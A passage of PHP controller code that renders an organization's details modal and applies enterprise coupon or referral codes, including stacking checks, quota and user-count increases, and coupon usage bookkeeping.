            $fieldObj['fldValue'] = $organization->system_name;
            array_push($orgFieldsArr, $fieldObj);
        }
        
        if(isset($organization->email) && $organization->email != "") 
        {
            $fieldObj = array();
            $fieldObj['fldTitle'] = 'Email';
            $fieldObj['fldValue'] = $organization->email;
            array_push($orgFieldsArr, $fieldObj);
        }
        
        if(isset($organization->address) && $organization->address != "") 
        {
            $fieldObj = array();
            $fieldObj['fldTitle'] = 'Address';
            $fieldObj['fldValue'] = $organization->address;
            array_push($orgFieldsArr, $fieldObj);
        }

        $chatRedirections = OrganizationChatRedirection::get();
        $chatRedirectionArr = array();
        foreach ($chatRedirections as $chatRedirection) {
            $chatRedirectionArr[$chatRedirection->organization_chat_redirection_id] = $chatRedirection->redirection_text;
        }

        $appEmail = $organization->app_email;
        $appPhone = $organization->app_phone;
        $appWebsite = $organization->app_website;
        $appDescription = $organization->app_description;

        $appDetails = array();
        $appDetails['email'] = $appEmail;
        $appDetails['phone'] = $appPhone;
        $appDetails['website'] = $appWebsite;
        $appDetails['description'] = $appDescription;

        $encUserToken = Input::get('usrtoken'); 

        $viewDetails = array();
        $viewDetails['orgLogoUrl'] = $orgLogoUrl;
        $viewDetails['orgFieldsArr'] = $orgFieldsArr;
        $viewDetails['isView'] = FALSE;
        $viewDetails['usrtoken'] = $encUserToken;
   
        $_viewToRender = View::make('organization.partialview._orgStackReferralCodeModal', $viewDetails);
        $_viewToRender = $_viewToRender->render();

        $response['view'] = $_viewToRender;  

        $response['status'] = $status;
        $response['msg'] = "$msg";

        return Response::json($response);
    }

    public function saveOrgStackReferralCode()
    {
        $msg = "";
        $status = 0;

        if(!isset($this->userId) || $this->userId <= 0)
        {
            $msg = Config::get("app_config_notif.err_invalid_user");
            $response = array('status' => -1, 'msg' => "$msg" );
            return Response::json($response); 
        }

        $referralCodeText = Input::get('org_ref_code');
        $referralCodeText = preg_replace("/\s+/", "", $referralCodeText);
        $userIpAddress = Input::get('ipAddress');

        $response = array();

        $isValidReferralCode = 0;
        $enterpriseActivationDate = NULL;
        $enterpriseExpirationDate = NULL;
        $enterpriseUserCount = 0;
        $enterpriseQuotaInGb = 0;
        $referralCodeId = 0;
        $hasReferral = 0;
        $enterpriseCouponCodeId = 0;
        $hasEnterpriseCoupon = 0;
        $alreadyUsedEnterpriseCouponCodes = NULL;
        $isStacked = 0;
        $isStackable = 0;
        $codeCannotBeStacked = 0;
        if(isset($referralCodeText) && $referralCodeText != "")
        {
            $referralCode = NULL;// = OrgReferralCode::active()->byCode($referralCodeText)->isValidForUsage()->first();
            $enterpriseCouponCode = EnterpriseCouponCode::isCouponCodeValidForUsage($referralCodeText)->first();
            if(isset($referralCode))
            {
                $isValidReferralCode = 1;
                $hasReferral = 1;
                $referralCodeId = $referralCode->referral_code_id;
                $enterpriseUserCount = $referralCode->user_count;
                $enterpriseQuotaInGb = $referralCode->allotted_quota_in_gb;

                $utcTz =  'UTC';

                $enterpriseActivationDate = Carbon::now($utcTz);
                $enterpriseActivationDate = $enterpriseActivationDate->toDateString();

                $enterpriseExpirationDate = Carbon::now($utcTz);
                $enterpriseExpirationDate = $enterpriseExpirationDate->addYear();
                $enterpriseExpirationDate = $enterpriseExpirationDate->toDateString();
            }
            elseif(isset($enterpriseCouponCode))
            {
                $isValidReferralCode = 1;
                $hasEnterpriseCoupon = 1;
                $enterpriseCouponCodeId = $enterpriseCouponCode->enterprise_coupon_code_id;

                $coupon = $enterpriseCouponCode->enterpriseCoupon;
                $couponId = $enterpriseCouponCode->enterprise_coupon_id;

                $alreadyUsedEnterpriseCouponCodes = EnterpriseCouponCode::ofCoupon($couponId)->ofUtilizedByOrganization($this->organizationId)->get();
                if(isset($alreadyUsedEnterpriseCouponCodes) && count($alreadyUsedEnterpriseCouponCodes) > 0)
                {
                    $isStacked = 1;
                    $isStackable = $coupon->is_stackable;
                    if($isStackable == 0)
                    {
                        $codeCannotBeStacked = 1;
                        $isValidReferralCode = 0;
                    }
                }

                $enterpriseUserCount = $coupon->allotted_user_count;
                $enterpriseQuotaInGb = $coupon->allotted_space_in_gb;

                $utcTz =  'UTC';

                $enterpriseActivationDate = Carbon::now($utcTz);
                $enterpriseActivationDate = $enterpriseActivationDate->toDateString();

                $enterpriseExpirationDate = Carbon::now($utcTz);
                $enterpriseExpirationDate = $enterpriseExpirationDate->addDays($coupon->subscription_validity_days);
                $enterpriseExpirationDate = $enterpriseExpirationDate->toDateString();
            }
        }

        if(isset($isValidReferralCode) && $isValidReferralCode == 1)
        {
            $organization = OrganizationClass::getOrganizationFromOrgId($this->organizationId);
            if(isset($organization) && $organization->is_active == 1)
            {
                $orgSubscription = OrganizationSubscription::ofOrganization($this->organizationId)->active()->first();

                $organization->has_coupon = $hasEnterpriseCoupon;
                $organization->enterprise_coupon_code_id = $enterpriseCouponCodeId;
                $organization->save();

                $existingUserCount = $orgSubscription->user_count;
                $existingQuotaInGb = $orgSubscription->allotted_quota_in_gb;

                $updUserCount = $existingUserCount + $enterpriseUserCount;
                $updQuotaInGb = $existingQuotaInGb + $enterpriseQuotaInGb;

                $orgSubscription->user_count = $updUserCount;
                $orgSubscription->allotted_quota_in_gb = $updQuotaInGb;
                $orgSubscription->save();

                if($hasEnterpriseCoupon == 1 && $enterpriseCouponCodeId > 0)
                {
                    $currTimestamp = CommonFunctionClass::getCurrentTimestamp();

                    $enterpriseCouponCodeForUpd = EnterpriseCouponCode::byId($enterpriseCouponCodeId)->first();

                    $enterpriseCouponId = $enterpriseCouponCodeForUpd->enterprise_coupon_id;
                    
                    $enterpriseCouponForUpd = EnterpriseCoupon::byId($enterpriseCouponId)->first();

                    $stackCount = 0;
                    $stackPosition = 0;

                    $enterpriseCouponCodeForUpd->is_utilized = 1;
                    $enterpriseCouponCodeForUpd->utilized_by_organization_admin = $this->userId;
                    $enterpriseCouponCodeForUpd->organization_id = $this->organizationId;
                    $enterpriseCouponCodeForUpd->utilized_at = $currTimestamp;
                    $enterpriseCouponCodeForUpd->user_ip_address = $userIpAddress;
                    $enterpriseCouponCodeForUpd->allotted_space_in_gb = $enterpriseCouponForUpd->allotted_space_in_gb;
                    $enterpriseCouponCodeForUpd->allotted_user_count = $enterpriseCouponForUpd->allotted_user_count;
                    $enterpriseCouponCodeForUpd->subscription_start_date = $enterpriseActivationDate;
                    $enterpriseCouponCodeForUpd->subscription_end_date = $enterpriseExpirationDate;
                    $enterpriseCouponCodeForUpd->is_stacked = $isStacked;
                    $enterpriseCouponCodeForUpd->stack_count = $stackCount;
                    $enterpriseCouponCodeForUpd->stack_position = $stackPosition;
                    $enterpriseCouponCodeForUpd->save();

                    $utilizedEnterpriseCouponCodeCount = EnterpriseCouponCode::ofCoupon($enterpriseCouponId)->isUtilized()->count();

                    $availableEnterpriseCouponCodeCount = $enterpriseCouponForUpd->coupon_count - $utilizedEnterpriseCouponCodeCount;

                    $enterpriseCouponForUpd->available_coupon_count = $availableEnterpriseCouponCodeCount;
                    $enterpriseCouponForUpd->utilized_coupon_count = $utilizedEnterpriseCouponCodeCount;
                    $enterpriseCouponForUpd->save();

                    MailClass::sendOrganizationEnterpriseCouponCodeUtilizedMail($this->organizationId, $enterpriseCouponCodeId);
                }

                $status = 1;
            }
            else
            {
                $status = -1;
                $msg = Config::get('app_config_notif.err_invalid_data');
            }
        }
        else if(isset($codeCannotBeStacked) && $codeCannotBeStacked == 1)
        {
            $status = -1;
            $msg = 'The code is not stackable';
        }
        else
        {
            $status = -1;
            $msg = Config::get('app_config_notif.err_invalid_data');
        }

        $response['status'] = $status;
        $response['msg'] = "$msg";

        return Response::json($response);
    }
}